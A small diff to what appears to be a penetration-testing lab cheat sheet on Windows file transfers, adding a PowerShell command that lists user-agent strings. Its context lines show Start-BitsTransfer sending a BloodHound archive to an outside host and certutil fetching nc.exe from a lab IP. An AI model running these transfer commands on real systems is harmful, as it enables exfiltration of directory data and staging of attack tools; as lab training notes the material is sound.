@@ -71,4 +71,8 @@ PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.1
 certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
+## Get User Agents for Powershell
 
+```Powershell
+PS C:\htb> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | Format-List
+```
